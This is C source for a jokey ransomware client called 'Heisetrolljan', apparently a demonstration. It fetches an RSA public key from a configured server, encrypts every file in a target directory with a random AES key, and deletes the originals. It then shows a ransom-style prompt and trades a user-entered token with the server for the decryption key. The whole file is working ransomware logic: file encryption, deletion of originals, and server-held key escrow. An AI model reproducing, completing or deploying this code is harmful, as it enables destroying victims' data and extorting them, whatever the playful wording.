/* 
 * HTR -- The Heisetrolljan
 * 
 * Copyright (C) 2016  Martin Wolters
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to 
 * the Free Software Foundation, Inc.
 * 51 Franklin Street, Fifth Floor
 * Boston, MA  02110-1301, USA
 * 
 */

#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "aes.h"
#include "cl_net.h"
#include "config.h"
#include "etc.h"
#include "filecrypt.h"
#include "fslist.h"
#include "protocol.h"
#include "rsa.h"
#include "rsa_io.h"
#include "sha256.h"

#define PUBFILE			"enc_key.bin"
#define SECFILE			"dec_key.bin"

#define TOKEN_ACCEPTED	1
#define TOKEN_REJECTED	-1
#define TOKEN_REUSED	-2
#define UNKNOWN_KEY		-3
#define GENERIC_ERROR	-4

static int hasext(const char *filename, char *ext) {
	size_t namelen = strlen(filename);
	size_t extlen = strlen(ext);

	if(namelen < extlen + 1)
		return 0;

	if(strcmp(filename + namelen - extlen, ext))
		return 0;

	return 1;
}

static int enc_dir(const char *basedir, const uint8_t *key) {
	fslist_t *list;
	size_t i;
	char *infile, outfile[PATH_MAX];

	printf("Scanning '%s' for possible frobnications...\n", CONFIG_CRYPTDIR);
	
	if((list = fslist_scan(basedir)) == 0) return 0;

	for(i = 0; i < list->n; i++) {
		infile = list->filename[i];
		printf(" - %s\n", infile);
		snprintf(outfile, PATH_MAX, "%s%s", infile, CONFIG_CRYPTED_EXT);
		if(!hasext(infile, CONFIG_CRYPTED_EXT) ) {
			file_enc(infile, outfile, key);
			remove(infile);
		}
	}

	printf("Done.\n\n");

	fslist_free(list);
	return 1;
}

static int dec_dir(const char *basedir, const uint8_t *key) {
	fslist_t *list;
	size_t i;
	char *infile, outfile[PATH_MAX];

	printf("Scanning '%s' for trading cards...\n", CONFIG_CRYPTDIR);
	
	if((list = fslist_scan(basedir)) == 0) return 0;

	for(i = 0; i < list->n; i++) {
		infile = list->filename[i];
		printf(" - %s\n", infile);
		strncpy(outfile, infile, PATH_MAX);
		outfile[strlen(infile) - strlen(CONFIG_CRYPTED_EXT)] = '\0';
	
		if(hasext(infile, CONFIG_CRYPTED_EXT)) {
			file_dec(infile, outfile, key);
			remove(infile);
		}
	}

	printf("Done.\n\n");

	fslist_free(list);
	return 1;
}

static rsa_keypair_t *remote_pubkey(uint8_t **serialized, size_t *len) {
	uint8_t querypak[5];
	uint8_t *reply;
	size_t reply_len;
	rsa_keypair_t *pair, *out = NULL;

	inttoarr(1, querypak);
	querypak[4] = NET_CL_REQ_PUBLIC;

	if((reply = cl_oneshot(CONFIG_SV_ADDR, CONFIG_SV_PORT, querypak, 5, &reply_len)) == NULL)
		return NULL;

	if((pair = rsa_read_public(reply + 1, reply_len - 1)) == NULL) goto freerep;
	if((*serialized = rsa_serialize_public(pair, len)) == NULL) goto freepair;

	out = pair;

freepair:
	if(out == NULL)
		rsa_keypair_free(pair);
freerep:
	free(reply);
	return out;
}

static uint8_t *request_pubkey(void) {
	size_t pub_len, ct_len;
	rsa_keypair_t *pair;
	uint8_t *pub_serial, *sym_key, *enc_key, *out = NULL;
	FILE *fp;

	printf("Requesting the online gizmo...\n");
	if((sym_key = malloc(AES_KSIZE)) == NULL) return NULL;

	if((pair = remote_pubkey(&pub_serial, &pub_len)) == NULL) goto freesym;
	getrand(sym_key, AES_KSIZE, NULL);
	if((enc_key = rsa_enc_padded(sym_key, AES_KSIZE, pair, &ct_len)) == NULL) goto freepair;

	if((fp = fopen(PUBFILE, "wb")) == NULL) goto freeenc;

	if(fwrite(&pub_len, INT_SIZE, 1, fp) == 0) goto closefp;
	if(fwrite(pub_serial, pub_len, 1, fp) == 0) goto closefp;
	if(fwrite(&ct_len, INT_SIZE, 1, fp) == 0) goto closefp;
	if(fwrite(enc_key, ct_len, 1, fp) == 0) goto closefp;
	out = sym_key;

	printf("Done.\n\n");

closefp:
	fclose(fp);
freeenc:
	free(enc_key);
freepair:
	free(pub_serial);
	rsa_keypair_free(pair);
freesym:
	if(out == NULL)
		free(sym_key);
	return out;
}

static uint8_t *remote_seckey(const char *token, const uint8_t *key_id, size_t *len, int *status) {
	uint8_t *querypak;
	uint8_t *reply, *out = NULL;
	size_t token_len, request_len, reply_len;

	token_len = strlen(token);
	request_len = 5 + SHA256_SIZE + token_len;

	if((querypak = malloc(request_len)) == NULL) return NULL;

	inttoarr(request_len - 4, querypak);
	querypak[4] = NET_CL_REQ_SECRET;
	memcpy(querypak + 5, key_id, SHA256_SIZE);
	memcpy(querypak + 5 + SHA256_SIZE, token, token_len);

	if((reply = cl_oneshot(CONFIG_SV_ADDR, CONFIG_SV_PORT, querypak, request_len, &reply_len)) == NULL) goto freepak;
	if(reply_len < 1) goto freerep;

	switch(reply[0]) {
		case NET_SV_SECRET:
			if(len)		*len = reply_len;
			if(status) 	*status = TOKEN_ACCEPTED; 
			out = reply;
			break;
		case NET_SV_TOKEN_OLD:
			if(len)		*len = 0;
			if(status)	*status = TOKEN_REUSED;
			break;
		case NET_SV_TOKEN_WRONG:
			if(len)		*len = 0;
			if(status)	*status = TOKEN_REJECTED;
			break;
	}
	
freerep:
	if(out == NULL)
		free(reply);
freepak:
	free(querypak);
	return out;

}

static uint8_t *request_seckey(const char *token, int *status) {
	rsa_keypair_t *pair;
	FILE *secfp, *pubfp;
	uint32_t offs;
	size_t declen, keylen, fsize = INT_SIZE;
	uint8_t *sec_key, key_id[32], *enc_key, *sym_key = NULL;
	uint8_t *buf;

	*status = GENERIC_ERROR;
	/* Read the encrypted symmetric key */
	if((pubfp = fopen(PUBFILE, "rb")) == NULL) return NULL;
	if(fread(&offs, INT_SIZE, 1, pubfp) == 0) return NULL;
	fsize += offs;
	if(fseek(pubfp, offs, SEEK_CUR) == -1) return NULL;
	if(fread(&offs, INT_SIZE, 1, pubfp) == 0) return NULL;
	fsize += offs;
	if((enc_key = malloc(offs)) == NULL) goto closepub;
	if(fread(enc_key, offs, 1, pubfp) == 0) goto freeenc;

	/* Get the key id */
	if(fseek(pubfp, INT_SIZE, SEEK_SET) == -1) goto freeenc;
	if((buf = malloc(fsize)) == NULL) goto freeenc;
	if(fread(buf, fsize, 1, pubfp) == 0) goto freebuf;
	if(rsa_keyid_fromserial(buf, key_id) == 0) goto freebuf;

	/* Do the actual request */
	if((sec_key = remote_seckey(token, key_id, &keylen, status)) == NULL) goto freebuf;
	
	*status = GENERIC_ERROR;
	if((secfp = fopen(SECFILE, "wb")) != NULL) {
		fwrite(sec_key + 1, keylen - 1, 1, secfp);
		fclose(secfp);
	}
	
	if((pair = rsa_read_secret(sec_key + 1, keylen - 1)) == NULL) goto freesec;

	*status = TOKEN_ACCEPTED;
	sym_key = rsa_dec_padded(enc_key, offs, pair, &declen);

	rsa_keypair_free(pair);
freesec:
	free(sec_key);
freebuf:
	free(buf);
freeenc:
	free(enc_key);
closepub:
	fclose(pubfp);
	return sym_key;
}

static int current_runlevel(void) {
	FILE *fp;
	int runlevel = 0;

	/* Did we receive a public key yet? */
	if((fp = fopen(PUBFILE, "rb")) != NULL) {
		fclose(fp);
		runlevel = 1;
		
		/* Do we also have the secret key? */
		if((fp = fopen(SECFILE, "rb")) != NULL) {
			runlevel = 2;
			fclose(fp);
		}
	}
	
	return runlevel;
}

int main(void) {
	int runlevel, status;
	uint8_t *sym_key;
	char *request_token;

	runlevel = current_runlevel();

	switch(runlevel) {
		case 0:
			if((sym_key = request_pubkey()) == NULL) {
				fprintf(stderr, "Request failed.\n");
				return EXIT_FAILURE;
			}

			enc_dir(CONFIG_CRYPTDIR, sym_key);
			free(sym_key);
		case 1:
			printf("Oh noes! I accidentally on all your hats and broke your trophies. :/\n");
			printf("Enter your mom's credit card number to undo or press CTRL-C to cancel.\n");

			status = GENERIC_ERROR;
			do {
				if(status == TOKEN_REJECTED)
					printf("That didn't work :( Try again.\n");
				if(status == TOKEN_REUSED)
					printf("I remember that one... It was wrong, right?\n");
				request_token = line_in(stdin);
				if(request_token[0] == '\0')
					break;

				sym_key = request_seckey(request_token, &status);
				free(request_token);
			} while((status == TOKEN_REJECTED) || (status == TOKEN_REUSED));

			if(status == TOKEN_REUSED) {

			}
			if(status == GENERIC_ERROR) {
				fprintf(stderr, "Something went wrong. You lost 10%% XP. Maybe try again later.\n");
				break;
			} else if(status == UNKNOWN_KEY) {
				fprintf(stderr, "Looks like I lost my key. Thanks anyway.\n");
				break;
			}
			printf("YAY! It worked! :D Let me upgrade your DLC...\n\n");
			dec_dir(CONFIG_CRYPTDIR, sym_key);
			free(sym_key);

			break;
		case 2:
			printf("Deleting keys... ");
			remove(PUBFILE);
			remove(SECFILE);
			printf("Done.\n");
			printf("Thank you for choosing heisetrolljan\n");
	}
	return EXIT_SUCCESS;
}
